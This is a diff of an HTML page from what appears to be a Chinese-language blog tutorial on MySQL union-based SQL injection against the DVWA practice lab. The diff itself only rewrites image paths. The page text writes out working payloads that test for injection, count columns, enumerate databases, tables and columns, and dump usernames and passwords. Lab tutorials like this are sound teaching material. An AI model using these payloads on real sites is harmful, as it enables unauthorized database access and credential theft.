@@ -41,71 +41,71 @@
 <p>前缀和后缀通过与原有执行部分形成闭合，使sql语句有效。通过在语句部分构造查询语句，获取数据库内容。</p>
 <h3 id="2-1-注入判断"><a href="#2-1-注入判断" class="headerlink" title="2.1 注入判断"></a>2.1 注入判断</h3><p><strong>对于任何存在用户可控输入的参数，都是我们测试的选择，部分参数隐藏在post表单，ajax请求、js等，对于这些可通过burp抓包获取。</strong></p>
 <p>输入 1时，dvwa显示了id为1的用户名称。</p>
-<p><img alt="1570281383648" data-src="/.io//1570281383648.png" class="lozad"></p>
+<p><img alt="1570281383648" data-src="/2019/10/06/MYSQL-联合注入-md/1570281383648.png" class="lozad"></p>
 <p>输入<code>0</code>时，无结果输出，此时可判断数据库中不存在id为0的用户。</p>
-<p><img alt="1570281698418" data-src="/.io//1570281698418.png" class="lozad"></p>
+<p><img alt="1570281698418" data-src="/2019/10/06/MYSQL-联合注入-md/1570281698418.png" class="lozad"></p>
 <p>输入<code>&#39;</code> 时，dvwa产生了报错。我们要思考，在这里它为什么会产生报错，对于一些符号的使用，它是配对的，<code>&#39;&#39;</code>、<code>&quot;&quot;</code>、<code>{}</code>等，当出现符号不匹配时，此时mysql会产生报错，由此可推测输入参数由<code>&#39;&#39;</code>单引号包裹。此时通过闭合前后单引号，构造语句，获取数据。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;0&apos;&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570281488038" data-src="/.io//1570281488038.png" class="lozad"></p>
+<p><img alt="1570281488038" data-src="/2019/10/06/MYSQL-联合注入-md/1570281488038.png" class="lozad"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA-master/vulnerabilities/sqli/?id=1%27%20or%201=1--%20%20&amp;Submit=Submit#</span><br><span class="line"></span><br><span class="line">0&apos;   OR 1=1   --     OR  1=1  为永真-</span><br><span class="line">前缀    语句   后缀</span><br></pre></td></tr></table></figure>
 
 <p>通过<code>0&#39;   OR 1=1   --</code>执行，返回结果，此时结果发生改变，数据库执行了我们构造的语句，证明存在注入。</p>
-<p><img alt="1570281943079" data-src="/.io//1570281943079.png" class="lozad"></p>
+<p><img alt="1570281943079" data-src="/2019/10/06/MYSQL-联合注入-md/1570281943079.png" class="lozad"></p>
 <h3 id="2-2-字段数量判断"><a href="#2-2-字段数量判断" class="headerlink" title="2.2 字段数量判断"></a>2.2 字段数量判断</h3><p>union联合查询要求，前后查询字段数量相同。</p>
 <h4 id="order-by-排序"><a href="#order-by-排序" class="headerlink" title="order by 排序"></a><strong>order by 排序</strong></h4><p>通过order by 排序指定查询列，如果不存在，则数据库报错。</p>
 <p>数据库查询结果：</p>
-<p><img alt="1570282629999" data-src="/.io//1570282629999.png" class="lozad"></p>
+<p><img alt="1570282629999" data-src="/2019/10/06/MYSQL-联合注入-md/1570282629999.png" class="lozad"></p>
 <p>dvwa测试：</p>
 <p>可判断出select查询语句字段数为2。</p>
-<p><img alt="1570282715843" data-src="/.io//1570282715843.png" class="lozad"></p>
-<p><img alt="1570282735736" data-src="/.io//1570282735736.png" class="lozad"></p>
-<p><img alt="1570282864203" data-src="/.io//1570282864203.png" class="lozad"></p>
+<p><img alt="1570282715843" data-src="/2019/10/06/MYSQL-联合注入-md/1570282715843.png" class="lozad"></p>
+<p><img alt="1570282735736" data-src="/2019/10/06/MYSQL-联合注入-md/1570282735736.png" class="lozad"></p>
+<p><img alt="1570282864203" data-src="/2019/10/06/MYSQL-联合注入-md/1570282864203.png" class="lozad"></p>
 <h4 id="select-…-into"><a href="#select-…-into" class="headerlink" title="select … into"></a>select … into</h4><p><strong>原理？</strong></p>
 <p>数据库查询结果：</p>
-<p><img alt="1570283081674" data-src="/.io//1570283081674.png" class="lozad"></p>
+<p><img alt="1570283081674" data-src="/2019/10/06/MYSQL-联合注入-md/1570283081674.png" class="lozad"></p>
 <p>dvwa:</p>
 <p>不正确直接报错，正确不输出结果</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; limit 1,1 into @,@,@ --</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570283212146" data-src="/.io//1570283212146.png" class="lozad"></p>
-<p><img alt="1570283233879" data-src="/.io//1570283233879.png" class="lozad"></p>
+<p><img alt="1570283212146" data-src="/2019/10/06/MYSQL-联合注入-md/1570283212146.png" class="lozad"></p>
+<p><img alt="1570283233879" data-src="/2019/10/06/MYSQL-联合注入-md/1570283233879.png" class="lozad"></p>
 <h4 id="已知表名判断"><a href="#已知表名判断" class="headerlink" title="已知表名判断"></a>已知表名判断</h4><p>原理？</p>
-<p><img alt="1570283597176" data-src="/.io//1570283597176.png" class="lozad"></p>
+<p><img alt="1570283597176" data-src="/2019/10/06/MYSQL-联合注入-md/1570283597176.png" class="lozad"></p>
 <h3 id="2-3-判断显位"><a href="#2-3-判断显位" class="headerlink" title="2.3 判断显位"></a>2.3 判断显位</h3><p><strong>显位指后端将查询结果输出到前端页面的字段，通过操纵该字段返回数据。</strong></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,2 --</span><br></pre></td></tr></table></figure>
 
 <p>1,2 都输出到了前端页面，所以此时，这两个字段都可以作为显位。</p>
-<p><img alt="1570283741061" data-src="/.io//1570283741061.png" class="lozad"></p>
+<p><img alt="1570283741061" data-src="/2019/10/06/MYSQL-联合注入-md/1570283741061.png" class="lozad"></p>
 <h3 id="2-4-获取数据库"><a href="#2-4-获取数据库" class="headerlink" title="2.4 获取数据库"></a>2.4 获取数据库</h3><hr>
 <p><strong>在mysql低于特定版本时，此时没有information_schema数据库，对于数据库、表、字段的获取，只能够通过暴力猜解来完成。</strong></p>
 <p>数据库：</p>
-<p><img alt="1570284639365" data-src="/.io//1570284639365.png" class="lozad"></p>
+<p><img alt="1570284639365" data-src="/2019/10/06/MYSQL-联合注入-md/1570284639365.png" class="lozad"></p>
 <p>dvwa:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select schema_name,2 from information_schema.schemata--</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570284750792" data-src="/.io//1570284750792.png" class="lozad"></p>
+<p><img alt="1570284750792" data-src="/2019/10/06/MYSQL-联合注入-md/1570284750792.png" class="lozad"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select group_concat(schema_name),2 from information_schema.schemata--</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570284797646" data-src="/.io//1570284797646.png" class="lozad"></p>
+<p><img alt="1570284797646" data-src="/2019/10/06/MYSQL-联合注入-md/1570284797646.png" class="lozad"></p>
 <h3 id="2-5-获取表"><a href="#2-5-获取表" class="headerlink" title="2.5 获取表"></a>2.5 获取表</h3><p>数据库：</p>
-<p><img alt="1570284974818" data-src="/.io//1570284974818.png" class="lozad"></p>
+<p><img alt="1570284974818" data-src="/2019/10/06/MYSQL-联合注入-md/1570284974818.png" class="lozad"></p>
 <p>dvwa:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select table_name,2 from information_schema.tables where table_schema=&apos;dvwa&apos;--</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570285096242" data-src="/.io//1570285096242.png" class="lozad"></p>
+<p><img alt="1570285096242" data-src="/2019/10/06/MYSQL-联合注入-md/1570285096242.png" class="lozad"></p>
 <h3 id="2-6-获取字段"><a href="#2-6-获取字段" class="headerlink" title="2.6 获取字段"></a>2.6 获取字段</h3><p>数据库：</p>
-<p><img alt="1570285299015" data-src="/.io//1570285299015.png" class="lozad"></p>
+<p><img alt="1570285299015" data-src="/2019/10/06/MYSQL-联合注入-md/1570285299015.png" class="lozad"></p>
 <p>dvwa:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select column_name,2 from information_schema.columns where table_name=&apos;users&apos;--</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570285320213" data-src="/.io//1570285320213.png" class="lozad"></p>
+<p><img alt="1570285320213" data-src="/2019/10/06/MYSQL-联合注入-md/1570285320213.png" class="lozad"></p>
 <h3 id="2-7-获取数据"><a href="#2-7-获取数据" class="headerlink" title="2.7 获取数据"></a>2.7 获取数据</h3><p>数据库：</p>
-<p><img alt="1570285534347" data-src="/.io//1570285534347.png" class="lozad"></p>
+<p><img alt="1570285534347" data-src="/2019/10/06/MYSQL-联合注入-md/1570285534347.png" class="lozad"></p>
 <p>dvwa:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&apos; union select group_concat(user,0x7e,password),2 from users--</span><br></pre></td></tr></table></figure>
 
-<p><img alt="1570285479522" data-src="/.io//1570285479522.png" class="lozad"></p>
+<p><img alt="1570285479522" data-src="/2019/10/06/MYSQL-联合注入-md/1570285479522.png" class="lozad"></p>
 <h2 id="3-注入总结"><a href="#3-注入总结" class="headerlink" title="3 注入总结"></a>3 注入总结</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注入语句,如存在编码问题，可使用十六进制编码后传入  hex</span><br></pre></td></tr></table></figure>
 
 <table>
